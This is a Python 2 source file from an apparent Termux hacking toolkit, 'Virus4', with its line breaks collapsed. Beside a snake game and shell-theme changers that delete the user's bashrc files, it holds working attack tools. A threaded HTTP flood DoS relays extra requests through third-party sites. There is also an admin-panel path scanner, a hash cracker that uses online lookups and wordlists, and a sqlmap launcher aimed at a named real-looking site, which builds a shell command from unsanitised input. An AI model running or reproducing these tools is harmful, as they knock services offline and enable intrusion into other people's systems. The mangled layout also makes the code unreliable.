while food == []:                               food = [randint(1, 18), randint(1, 58)]                 # Calculating next food's coordinates                                       if food in snake: food = []             win.addch(food[0], food[1], '*')        else:                                           last = snake.pop()                                          # [1] If it does not eat the food, length decreases                     win.addch(last[0], last[1], ' ')        win.addch(snake[0][0], snake[0][1], '#')                                             curses.endwin()                             print("\nScore - " + str(score))            backtomenu_games()                         def games_moon():                            os.system('apt-get install moon-buggy')     os.system('pkg install moon-buggy')         os.system('moon-buggy')                     backtomenu_games()                         def games_greed():                           os.system('apt-get install greed')          os.system('pkg install greed')              os.system('greed')                          backtomenu_games()                         def games():                                 print ''                                    time.sleep(0.05)                            print red +"                                          [0]back"                          time.sleep(0.05)                            print ''                                    time.sleep(0.05)                            print cyan +'        [01]games snake'       time.sleep(0.05)                            print cyan +'        [02]games moon-buggy'  time.sleep(0.05)                            print cyan +'        [03]games greed'       time.sleep(0.05)                            print ''                                    time.sleep(0.05)                            print ''                                    time.sleep(0.05)                            print ''                                    time.sleep(0.05)                            nember =raw_input("Virus4(" + red + "games"+ cyan + ") > ")                             if nember == '1' or nember == '01' :             games_snake()                          elif nember == '2' or nember == '02' :           games_moon()                           elif nember == '3' or nember == '03' :           games_greed()                          elif nember == '0' or nember == '00' :           Virus4()                               else :                                           error()                                     games()                               def termux_1():                              print ''                                    time.sleep(2)                               os.system('rm -rf sem.sh')                  f = open('sem.sh' , 'w')                    f.write('''                                read -p "            name-------> " amer    rm $HOME/.bashrc                            rm ~/../usr/etc/bash.bashrc                 sed "s/Sniper/$amer/" tools/Termux/termux_1 > ~/.bashrc                                 pkg install figlet                                                                      ''')                                         f.close()                                   os.system('bash sem.sh')                    os.system('rm -rf sem.sh')                  backtomenu_termux()                        def termux_2():                              print ''                                    time.sleep(2)                               os.system('rm -rf sem.sh')                  f = open('sem.sh' , 'w')                    f.write('''                                read -p "            name-------> " amer    rm $HOME/.bashrc                            rm ~/../usr/etc/bash.bashrc                 sed "s/max/$amer/" tools/Termux/termux_2 > ~/.bashrc                                    pkg install figlet                                                                      ''')                                         f.close()                                   os.system('bash sem.sh')                    os.system('rm -rf sem.sh')                  backtomenu_termux()                        def termux_3():                              print ''                                    time.sleep(2)                               os.system('rm -rf sem.sh')                  f = open('sem.sh' , 'w')                    f.write('''                                rm $HOME/.bashrc                            rm ~/../usr/etc/bash.bashrc                 sed "s/YourSelF/$amer/" tools/Termux/termux_3 > ~/.bashrc                               pkg install figlet                          ''')                                         f.close()                                   os.system('bash sem.sh')                    os.system('rm -rf sem.sh')                  backtomenu_termux()                        def termux():                                print ''                                    time.sleep(0.05)                            print red +"                                          [0]back"                          time.sleep(0.05)                            print ''                                    time.sleep(0.05)                            print cyan +'        [01]Change the shape of Termux'                                    time.sleep(0.05)                            print cyan +'        [02]Change shape of the skull Termux'                              time.sleep(0.05)                            print cyan +'        [03]Change shape of the skull(2) Termux'                           print ''                                    time.sleep(0.05)                            print ''                                    time.sleep(0.05)                            print ''                                    time.sleep(0.05)                            nember =raw_input("Virus4(" + red + "termux"+ cyan + ") > ")                            if nember == '1' or nember == '01' :             termux_1()                             elif nember == '2' or nember == '02' :           termux_2()                             elif nember == '3' or nember == '03' :           termux_3()                             elif nember == '0' or nember == '00' :           Virus4()                               else :                                           error()                                     termux()                              def ddos():                                                                              from queue import Queue                     from optparse import OptionParser           import time,sys,socket,threading,logging,urllib,random                                  def user_agent():                                  global uagent                               uagent=[]                                   uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")         uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")                                         uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")                                 uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")         uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")                                      uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")                                                  uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")                           return(uagent)                                                                                                               def my_bots():                                     global bots                                 bots=[]                                     bots.append("http://validator.w3.org/check?uri=")                                       bots.append("http://www.facebook.com/sharer/sharer.php?u=")                             return(bots)                                                                                                                 def bot_hammering(url):                            try:                                                while True:                                         req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))                             print "\033[94mbot is max...\033[0m"                                                    time.sleep(.1)              except:                                             time.sleep(.1)                                                                                                       def down_it(item):                                 try:                                                while True:                                         packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')                                                                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                                   s.connect((host,int(port)))                                                             if s.sendto( packet, (host, int(port)) ):                                                       s.shutdown(1)                                                                           print "\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--Max is attacking--> \033[0m"                                  else:                                               s.shutdown(1)                                                                           print "\033[91mshut<->down\033[0m"                                              time.sleep(.1)              except socket.error as e:                           print "\033[91mno connection! server maybe down\033[0m"                                 #print("\033[91m",e,"\033[0m")                                                          time.sleep(.1)                                                                                                       def dos():                                         while True:                                         item = q.get()                              down_it(item)                               q.task_done()                                                                                                        def dos2():                                        while True:                                         item=w.get()                                bot_hammering(random.choice(bots)+"http://"+host)                                       w.task_done()                                                                                                        def usage():                                       print('')                                                                                                                    def get_parameters():                              global host                                 global port                                 global thr                                  global item                                 optp = OptionParser(add_help_option=False,epilog="Hammers")                             optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)                                    optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")          optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")           optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 -t 135")                                                   optp.add_option("-h","--help",dest="help",action='store_true',help="help you")          opts, args = optp.parse_args()              logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')                                                       host = raw_input(green+'ip/link+----------> ')                                          port = raw_input(green+'port/80+----------> ')                                          thr = raw_input(green+'Time in seconds+--> ')                                           if opts.help:                                       usage()                             if opts.host is not None:                           host = opts.host                    else:                                               usage()                             if opts.port is None:                               port = 80                           else:                                               port = opts.port                    if opts.turbo is None:                              thr = 135                           else:                                               thr = opts.turbo                                                                                                    # reading headers                            global data                                 headers = open("headers.txt", "r")          data = headers.read()                       headers.close()                            #task queue are q,w                          q = Queue()                                 w = Queue()                                                                                                                         if __name__ == '__main__':                         if len(sys.argv) < 2:                               usage()                             get_parameters()                            print "\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m"                 print "\033[94mPlease wait...\033[0m"                                                   user_agent()                                my_bots()                                   time.sleep(5)                               try:                                                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                                   s.connect((host,int(port)))                 s.settimeout(1)                     except socket.error as e:                           print "\033[91mcheck server ip and port\033[0m"                                         usage()                             while True:                                         for i in range(int(thr)):                           t = threading.Thread(target=dos)                                                        t.daemon = True  # if thread is exist, it dies                                          t.start()                                   t2 = threading.Thread(target=dos2)                                                      t2.daemon = True  # if thread is exist, it dies                                         t2.start()                          start = time.time()                         #tasking                                    item = 0                                    while True:                                         if (item>1800): # for no memory crash                                                           item=0                                      time.sleep(.1)                                                                  item = item + 1                             q.put(item)                                 w.put(item)                         q.join()                                    w.join()                     backtomenu_website()                       def admin():                                 from urllib2 import Request, urlopen, URLError, HTTPError                                                                           def Space(j):                                      i = 0                                       while i<=j:                                         print " ",                                  i+=1                                                                                                                 def findAdmin():                                   f = open("link.txt","r");                   link = raw_input("Enter Site Name \n(ex : example.com or www.example.com ): ")          print "\n\nAvilable links : \n"             while True:                                         sub_link = f.readline()                     if not sub_link:                                    break                               req_link = "http://"+link+"/"+sub_link                                                  req = Request(req_link)                     try:                                                response = urlopen(req)                                                         except HTTPError as e:                              continue                            except URLError as e:                               continue                            else:                                               print "OK => ",req_link                                                                                      def Credit():                                      Space(9); print "#####################################"                                 Space(9); print "#   +++ welcome to my tools +++   #"                                   Space(9); print "#       I LOVE YOU MY FRINDES       #"                                 Space(9); print "#    My Name is Amer DZ {Virus4}    #"                                 Space(9); print "#####################################"                                                                      Credit()                                    findAdmin()                                 backtomenu_website()                       def hash_id():                               #! usr/bin/python2                                                                      """                                        __Author__ = Ci Ku ~ debby anggraini a.k.a xnver404                                     __Name__ = Virus4                           __version__ = 5.0.0                         __Code__ = python                           __Github__ = https://github.com/amerlaceser __Date__ = 26 - 8 - 2019                                                                """                                                                                      import sys ,  hashlib ,  time ,  os , random , binascii                                                                             from urllib import urlopen, urlencode       from re import search                                                                  # color                                      if sys.platform == "linux" or sys.platform == "linux2":                                                                                    BB = "\033[34;1m" # Blue light              YY = "\033[33;1m" # Yellow light            GG = "\033[32;1m" # Green light             WW = "\033[0;1m"  # White light             RR = "\033[31;1m" # Red light               CC = "\033[36;1m" # Cyan light              B = "\033[34m"    # Blue                    Y = "\033[33m"    # Yellow                  G = "\033[32m"    # Green                   W = "\033[0m"     # White                   R = "\033[31m"    # Red                     C = "\033[36m"    # Cyan                                                                # Random color                              rand = (BB,YY,GG,WW,RR,CC)                  P = random.choice(rand)                                                          elif sys.platform == "win32":                                                                  BB = '' # Blue light                        YY = '' # Yellow light                      GG = '' # Green light                       WW = '' # White light                       RR = '' # Red light                         CC = '' # Cyan light                        B = ''  # Blue                              Y = ''  # Yellow                            G = ''  # Green                             W = ''  # White                             R = ''  # Red                               C = ''  # Cyan                              P = ''  # Random color                                                           def banner():                                      print ""                                                                         def info():                                                                                    print ""                             def Update():                                      if sys.platform == "linux" or sys.platform == "linux2":                                         print (B+" 0={"+W+" UPDATE WORDLIST "+B+"}=0\n")                                        time.sleep(1)                                                                           print (B+"["+W+"="+B+"] "+G+"remove old wordlist")                                      os.system("sleep 2")                        time.sleep(1)                                                                           print (B+"["+W+"="+B+"] "+G+"downloading new wordlist")                                 time.sleep(1)                                                                           print (R+"["+W+"*"+R+"] "+R+"Curl Started ...\n"+W)                                                                                 os.system("sleep 0.5")                                                                  print (R+"\n["+W+"*"+R+"] "+G+"download Finish\n"+W)                                    sys.exit()                          else:                                               print ("sorry, word list update feature is only available on linux platform\n")                                                     sys.exit()                                                                                                           try:                                                                                           # module tambahan                                                                       import progressbar                          from passlib.hash import mysql323 as m20                                                from passlib.hash import mysql41 as m25                                                 from passlib.hash import mssql2000 as ms20                                              from passlib.hash import mssql2005 as ms25                                              from passlib.hash import nthash as nthash                                               from passlib.hash import lmhash as lmhash                                                                                    except ImportError:                                banner()                                    time.sleep(0.5)                             print (B+"["+W+"="+B+"] "+G+"installing module "+R+"progressbar , passlib\n"+W)                                                     os.system("pip2 install --upgrade pip")                                                 os.system("pip2 install passlib")           os.system("pip2 install progressbar")                                                                                               print (B+"\n["+W+"="+B+"] "+G+"install success , run program again\n"+W)                sys.exit()                                                                       def hash():                                        banner()                                                                                hash_str = raw_input(B+"["+W+"?"+B+"]"+G+" Hash : "+W)                          #       time.sleep(0.5)                             print (B+"["+R+"="+B+"] "+G+"Cek Hash Type ...")                                #       time.sleep(1)                                                                                                                       # Contoh Hash nya , nb : jangan di ubah ntar error                                                                                  SHA512= ('dd0ada8693250b31d9f44f3ec2d4a106003a6ce67eaa92e384b356d1b4ef6d66a818d47c1f3a2c6e8a9a9b9bdbd28d485e06161ccd0f528c8bbb5541c3fef36f')                                    md = ('ae11fd697ec92c7c98de3fac23aba525')                                               sha1 = ('4a1d4dbc1e193ec3ab2e9213876ceb8f4db72333')                                     sha224 = ('e301f414993d5ec2bd1d780688d37fe41512f8b57f6923d054ef8e59')                   sha384 = ('3b21c44f8d830fa55ee9328a7713c6aad548fe6d7a4a438723a0da67c48c485220081a2fbc3e8c17fd9bd65f8d4b4e6b')                       sha256 = ('2c740d20dab7f14ec30510a11f8fd78b82bc3a711abe8a993acdb323e78e6d5e')           mysql1323 = ("5d2e19393cc5ef67")            mysql41 = ("*88166B019A3144C579AC4A7131BCC3AD6FF61DA6")                                 mssql2000 = ("0x0100DE9B3306258B37432CAC3A6FB7C638946FA393E09C9CBC0FA8C6E03B803390B1C3E7FB112A21B2304595D490")                      mssql2005 = ('0x01008110620C7BD03A38A28A3D1D032059AE9F2F94F3B74397F8')                                                              if len(hash_str)==len(mysql1323) and hash_str.isdigit()==False and hash_str.isalpha()==False and hash_str.isalnum()==True:                  print (B+"["+R+"="+B+"] "+G+"hash type : "+W+"mysql 3.2.3")                             hash = "mysql1323"                                                              elif len(hash_str)==len(mysql41) and "*" in hash_str:                                           print (B+"["+R+"="+B+"] "+G+"hash type : "+W+"mysql 4.1")                               hash = "mysql41"                                                                elif len(hash_str)==len(mssql2000) and "0x0" in hash_str:                                       print (B+"["+R+"="+B+"] "+G+"hash type : "+W+"Mssql2000")                               hash = "mssql2000"                                                              elif len(hash_str)==len(mssql2005) and "0x0" in hash_str:                                       print (B+"["+R+"="+B+"] "+G+"hash type : "+W+"Mssql2005")                               hash = "mssql2005"                                                                                                          elif len(hash_str)==len(SHA512) and hash_str.isdigit()==False and hash_str.isalpha()==False and hash_str.isalnum()==True:                   print (Y+"   ["+W+"01"+Y+"] "+C+"sha512")                                               print (Y+"   ["+W+"02"+Y+"] "+C+"whirlpool")                            #               time.sleep(0.3)                             cek = raw_input(B+"["+W+"?"+B+"] "+G+"Choose hash "+Y+">>> "+W)                                                                     if cek == "1" or cek == "01" or cek == "sha512":                                                hash = "sha512"                     elif cek == "2" or cek == "02" or cek == "whirlpool":                                           hash = "whirlpool"                  else:                                               print (R+"["+W+"!"+R+"] "+G+"Exiting ... \n")                    #                       time.sleep(0.5)                            sys.exit()                                                              elif len(hash_str)==len(md) and hash_str.isdigit()==False and hash_str.isalpha()==False and hash_str.isalnum()==True:                                                                   print (Y+"   ["+W+"01"+Y+"] "+C+"md4")                                                  print (Y+"   ["+W+"02"+Y+"] "+C+"md5")                                                  print (Y+"   ["+W+"03"+Y+"] "+C+"Nthash")                                               print (Y+"   ["+W+"04"+Y+"] "+C+"Lmhash")                                               print (Y+"   ["+W+"05"+Y+"] "+C+"Ntlm hash")                                                                        #               time.sleep(0.3)                             cek = raw_input(B+"["+W+"?"+B+"] "+G+"Choose Hash "+Y+">>> "+W)                                                                     if cek == "1" or cek == "01" or cek == "md4" or cek == "MD4" or cek == "Md4":                                                               hash = "md4"                        elif cek == "2" or cek == "02" or cek == "md5" or cek == "MD5" or cek == "Md5":                                                             try:                                                print (B+"["+R+"="+B+"] "+G+"open google")              #                               time.sleep(0.3)                                                                         print (B+"["+W+"*"+B+"] "+G+"Start ...")                #                               time.sleep(0.3)                                                                         start = ("00:00:00")                                                                    start1 = time.time()                                                                    print (B+"\n["+W+"{}"+B+"] "+G+"Searching..."+Y).format(start)                                                                                                                  data = urlencode({"md5":hash_str,"x":"21","y":"8"})                                     html = urlopen("http://md5.my-addr.com/md5_decrypt-md5_cracker_online/md5_decoder_tool.php", data)                                  find = html.read()                                                                      match = search (r"<span class='middle_title'>Hashed string</span>: [^<]*</div>", find)                                              if match:                                                                                       end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                                                  print (B+"["+W+"{}"+B+"] "+G+"Stopped...").format(end)                                      #                                       time.sleep(0.3)                                                                         print (B+"\n["+W+"="+B+"]"+G+" password found ")                                        print (B+"["+W+"+"+B+"] "+W+(hash_str)+Y+" 0={==> "+W+(match.group().split('span')[2][3:-6])+"\n")                                                                              sys.exit()                                                                      else:                                               data = urlencode({"md5":hash_str,"x":"21","y":"8"})                                                                                 html = urlopen("http://md5.my-addr.com/md5_decrypt-md5_cracker_online/md5_decoder_tool.php", data)                                                                              find = html.read()                                                                      match = search (r"<span class='middle_title'>Hashed string</span>: [^<]*</div>", find)                                              if match:                                                                                                                                   end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                                              print (B+"["+W+"{}"+B+"] "+G+"Stopped...").format(end)                                  #                                          time.sleep(0.3)                                                                         print (B+"\n["+W+"="+B+"]"+G+" password found ")                                                                                    print (B+" ["+W+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+match.group().split('span')[2][3:-6]+W+" \n")                                                                              sys.exit()                                                                           else:                                                                                      url = "http://www.nitrxgen.net/md5db/" + hash_str                                                                                   cek = urlopen(url).read()                                                               if len(cek) > 0:                                                                                                                            end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                                          print (B+"["+W+"{}"+B+"] "+G+"Stopped...").format(end)                                   #                                          time.sleep(0.3)                                                                                  print (B+"\n["+W+"="+B+"]"+G+" password found ")                                                                                   print (B+"["+W+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+cek+"\n")                                                               sys.exit()                                                                              else:                                                                                                                                       end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                                          print (B+"["+W+"{}"+B+"]"+G+" password not found\n").format(end)                                                                    hash = "md5"                                                                                                     except IOError:                                                                                 end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                                                  print (B+"["+W+"{}"+B+"]"+G+" Timeout\n").format(end)                                   hash = "md5"                                                            elif cek == "03" or cek == "3" or cek.upper() == "NTHASH":                                      hash = "nthash"                                                                 elif cek == "04" or cek == "4" or cek.upper() == "LMHASH":                                      hash = "lmhash"                                                                 elif cek == "05" or cek == "5" or cek.upper() == "NTLM":                                        hash = "ntlm"                                                                   else:                                               print (R+"["+W+"!"+R+"] "+G+"Exiting ... \n"+W)                 #                       time.sleep(0.5)                             sys.exit()                                                                                                          elif len(hash_str)==len(sha1) and hash_str.isdigit()==False and hash_str.isalpha()==False and hash_str.isalnum()==True:                                                                 print (Y+"   ["+W+"01"+Y+"] "+C+"sha1")                                                 print (Y+"   ["+W+"02"+Y+"] "+C+"ripemd160")                            #               time.sleep(0.3)                             cek = raw_input(B+"["+W+"?"+B+"] "+G+"Choose Hash "+Y+">>> "+W)                                                                     if cek == "1" or cek == "01" or cek == "sha1" or cek == "SHA1" or cek == "Sha1":                                    #                       time.sleep(0.5)                             print (B+"["+R+"="+B+"] "+G+"open google")                      #                       time.sleep(0.3)                             print (B+"["+W+"*"+B+"] "+G+"Start ...")                        #                       time.sleep(0.3)                             start = ("00:00:00")                        start1 = time.time()                        print (B+"\n["+W+"{}"+B+"] "+G+"Searching..."+Y).format(start)                          try:                                                                                            data = urlencode({"auth":"8272hgt", "hash":hash_str, "string":"","Submit":"Submit"})                                                html = urlopen("http://hashcrack.com/index.php" , data)                                 find = html.read()                                                                      match = search (r'<span class=hervorheb2>[^<]*</span></div></TD>', find)                                                            if match:                                                                                       end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                                                  print (B+"["+W+"{}"+B+"] "+G+"Stopped...").format(end)                                      #                                       time.sleep(0.3)                                                                         print (B+"\n["+W+"="+B+"]"+G+" password found ")                                        print (B+"["+W+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+match.group().split('hervorheb2>')[1][:-18]+"\n")                                                                           sys.exit()                                                                                                                  else:                                                                                           end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                                                  print (B+"["+W+"{}"+B+"]"+G+" password not found\n").format(date)                                                                   hash = "sha1"                                                           except IOError:                                                                                 end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                                                  print (B+"["+W+"{}"+B+"]"+G+" Timeout\n").format(end)                                   hash = "sha1"                                                                                                       elif cek == "2" or cek == "02" or cek == "ripemd160":                                           hash = 'ripemd160'                  else:                                               print (R+"["+W+"!"+R+"] "+G+"Exiting ... \n"+W)                 #                       time.sleep(0.5)                             sys.exit()                                                              elif len(hash_str)==len(sha224) and hash_str.isdigit()==False and hash_str.isalpha()==False and hash_str.isalnum()==True:                   print (B+"["+R+"="+B+"] "+G+"hash type : "+W+"SHA224")                                  hash = "SHA224"                                                                 elif len(hash_str)==len(sha384) and hash_str.isdigit()==False and hash_str.isalpha()==False and hash_str.isalnum()==True:                   print (B+"["+R+"="+B+"] "+G+"hash type : "+W+"SHA384")                                  hash = "SHA384"                                                                 elif len(hash_str)==len(sha256) and hash_str.isdigit()==False and hash_str.isalpha()==False and hash_str.isalnum()==True:                   print (B+"["+R+"="+B+"] "+G+"hash type : "+W+"sha256")                  #               time.sleep(0.5)                             print (B+"["+R+"="+B+"] "+G+"open google")                              #               time.sleep(0.3)                             print (B+"["+W+"*"+B+"] "+G+"Start ...")                                #               time.sleep(0.3)                             start = ("00:00:00")                        start1 = time.time()                        print (B+"\n["+W+"{}"+B+"] "+G+"Searching..."+Y).format(start)                                                                      try:                                                data = urlencode({"hash":hash_str, "decrypt":"Decrypt"})                                html = urlopen("http://md5decrypt.net/en/Sha256/", data)                                find = html.read()                          match = search (r'<b>[^<]*</b><br/><br/>', find)                                        if match:                                                                                       end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                                                  print (B+"["+W+"{}"+B+"] "+G+"Stopped...").format(end)  #                               time.sleep(0.3)                                                                         print (B+"\n["+W+"="+B+"]"+G+" password found ")                                        print (B+"["+W+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+match.group().split('<b>')[1][:-14]+"\n")                                       sys.exit()                                                                      else:                                                                                           end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                                                  print (B+"["+W+"{}"+B+"]"+G+" password not found\n").format(end)                                                                    hash = "sha256"                                                         except IOError:                                                                                         end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                                                  print (B+"["+W+"{}"+B+"]"+G+" Timeout\n").format(end)                                   hash = "sha256"                                                                                             else:                                               print (R+"["+W+"!"+R+"] "+G+"Hash error\n"+W)                                           sys.exit()                                                                      time.sleep(0.1)                             print (B+"["+W+"="+B+"] "+G+"cek wordlist ..")                                                                                      try:                                                w = open("wordlist.txt","r").readlines()                                                x = len(w)                          except IOError:                     #               time.sleep(0.5)                             print (B+"["+R+"="+B+"]"+G+" Can't load "+W+"wordlist.txt, "+G+"file not exist\n"+W)                                                sys.exit()                                                              #       time.sleep(0.3)                             print (B+"["+R+"="+B+"] "+G+"load "+W+"{}"+G+" words in "+W+"wordlist.txt").format(x)                                               print (B+"["+W+"*"+B+"] "+G+"start ..\n")                                       #       time.sleep(1)                                                                           start = ("00:00:00")                        start1 = time.time()                        print (B+"["+W+"{}"+B+"] "+G+"Cracking..."+Y).format(start)                                                                         pbar = progressbar.ProgressBar()                                                        if hash == "mysql1323":                                                                         hash_str = hash_str.lower()                 for line in pbar(w):                                line = line.strip()                         h = m20.encrypt(line)                                                                                                                                                           if h == hash_str:                                                                               end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                  #                                time.sleep(0.3)                                                                        print (B+"\n["+W+"{}"+B+"] "+G+"Stopped...\n").format(end)                                          #                                time.sleep(0.3)                                                                        print (B+"["+W+"="+B+"]"+G+" password found ")                                          print (B+"["+R+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+line+W+"\n")                                                                    sys.exit()                                                              end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                      print (B+"["+W+"{}"+B+"]"+G+" password not found\n"+W).format(end)                      sys.exit()                                                                      elif hash == "lmhash":                                                                          hasb_str = hash_str.upper()                 for line in pbar(w):                                line = line.strip()                         h = lmhash.encrypt(line)                                                                if h == hash_str:                                                                               end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                  #                                time.sleep(0.3)                                                                        print (B+"\n["+W+"{}"+B+"] "+G+"Stopped...\n").format(end)                                          #                                time.sleep(0.3)                                                                        print (B+"["+W+"="+B+"]"+G+" password found ")                                          print (B+"["+R+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+line+W+"\n")                                                                    sys.exit()                                                              end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                      print (B+"["+W+"{}"+B+"]"+G+" password not found\n"+W).format(end)                      sys.exit()                                                                      elif hash == "nthash":                                                                          hasb_str = hash_str.upper()                 for line in pbar(w):                                line = line.strip()                         h = nthash.encrypt(line)                                                                                                            if h == hash_str:                                                                               end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                  #                                time.sleep(0.3)                                                                        print (B+"\n["+W+"{}"+B+"] "+G+"Stopped...\n").format(end)                                          #                                time.sleep(0.3)                                                                        print (B+"["+W+"="+B+"]"+G+" password found ")                                          print (B+"["+R+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+line+W+"\n")                                                                    sys.exit()                                                              end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                      print (B+"["+W+"{}"+B+"]"+G+" password not found\n"+W).format(end)                      sys.exit()                                                                      elif hash == "mysql41":                                                                         hash_str = hash_str.upper()                 for line in pbar(w):                                line = line.strip()                         h = m25.encrypt(line)                                                                                                               if h == hash_str:                                                                               end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                  #                                time.sleep(0.3)                                                                        print (B+"\n["+W+"{}"+B+"] "+G+"Stopped...\n").format(end)                                          #                                time.sleep(0.3)                                                                        print (B+"["+W+"="+B+"]"+G+" password found ")                                          print (B+"["+R+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+line+W+"\n")                                                                    sys.exit()                                                              end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                      print (B+"["+W+"{}"+B+"]"+G+" password not found\n"+W).format(end)                      sys.exit()                                                                      elif hash == "mssql2000":                                                                       hash_str = hash_str.upper()                 for line in pbar(w):                                line = line.strip()                         h = ms20.encrypt(line)                                                                                                              if h == hash_str:                                                                               end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                  #                                time.sleep(0.3)                                                                        print (B+"\n["+W+"{}"+B+"] "+G+"Stopped...\n").format(end)                                          #                                time.sleep(0.3)                                                                        print (B+"["+W+"="+B+"]"+G+" password found ")                                          print (B+"["+R+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+line+W+"\n")                                                                    sys.exit()                                                              end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                      print (B+"["+W+"{}"+B+"]"+G+" password not found\n"+W).format(end)                      sys.exit()                                                                      elif hash == "ntlm":                                                                            hash_str = hash_str.lower()                 for line in pbar(w):                                line = line.strip()                         h = ntlm_hash = binascii.hexlify(hashlib.new('md4', line.encode('utf-16le')).digest())                                              if h == hash_str:                                                                               end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                  #                               time.sleep(0.3)                                                                         print (B+"\n["+W+"{}"+B+"] "+G+"Stopped...\n").format(end)                                          #                                time.sleep(0.3)                                                                        print (B+"["+W+"="+B+"]"+G+" password found ")                                          print (B+"["+R+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+line+W+"\n")                                                                    sys.exit()                                                              end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                      print (B+"["+W+"{}"+B+"]"+G+" password not found\n"+W).format(end)                      sys.exit()                                                                      elif hash == "mssql2005":                                                                       hasb_str = hash_str.upper()                 for line in pbar(w):                                line = line.strip()                         h = ms25.encrypt(line)                                                                                                              if h == hash_str:                                                                               end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                  #                                time.sleep(0.3)                                                                        print (B+"\n["+W+"{}"+B+"] "+G+"Stopped...\n").format(end)                                          #                                time.sleep(0.3)                                                                        print (B+"["+W+"="+B+"]"+G+" password found ")                                          print (B+"["+R+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+line+W+"\n")                                                                    sys.exit()                                                                                                          end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                      print (B+"["+W+"{}"+B+"]"+G+" password not found\n"+W).format(end)                      sys.exit()                                                                      else:                                                                                           hash_str = hash_str.lower()                 for line in pbar(w):                                                                            line = line.strip()                         h = hashlib.new(hash)                                                                   h.update(line)                                                                          if h.hexdigest() == hash_str:                                                                                                               end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                                  #                               time.sleep(0.3)                                                                         print (B+"\n["+W+"{}"+B+"] "+G+"Stopped...\n").format(end)                                          #                               time.sleep(0.3)                                                                         print (B+"["+W+"="+B+"]"+G+" password found ")                                          print (B+"["+R+"+"+B+"] "+W+hash_str+Y+" 0={==> "+W+line+W+"\n")                                                                    sys.exit()                                                              end = time.strftime("%H:%M:%S", time.gmtime(time.time() - start1))                      print (B+"["+W+"{}"+B+"]"+G+" password not found\n"+W).format(end)                      sys.exit()                                                               try:                                               if sys.argv[1] == "-u":                             Update()                            elif sys.argv[1] == "-i" or sys.argv[1] == "--info":                                            info()                              else:                                               print (R+"["+W+"!"+R+"] "+G+"Command Error !!"+W)                                       sys.exit()                                                               except IndexError:                                 hash()                                                                           " Thanks you ^^"                            backtomenu_website()                       def termux_sql():                             def url():                                      print red +"                                          [0]back"                          time.sleep(0.05)                            print ""                                    time.sleep(0.05)                            print cyan+'[+]------'+red+' exomple '+cyan+'----------------------------------------------[+]'                                     time.sleep(0.05)                            print cyan+'  |  '+red+'URL :  '+cyan+'http://ceburealproperty.com/show_cat_page.php?id=3  |'                                       time.sleep(0.05)                            print cyan+'[+]-------------------------------------------------------------[+]'        time.sleep(0.05)                            url = raw_input(red +'   URL-------> ')                                                 a = str(url)                                if a == '0' or a == '00' :                    sql()                                     else :                                       os.system('python2 ~/sqlmap/sqlmap.py -u '+url+' --dbs s-- level=3 --risk=3 --batch')                                               def dataase():                               print red +"                                          [0]back"                          time.sleep(0.05)                      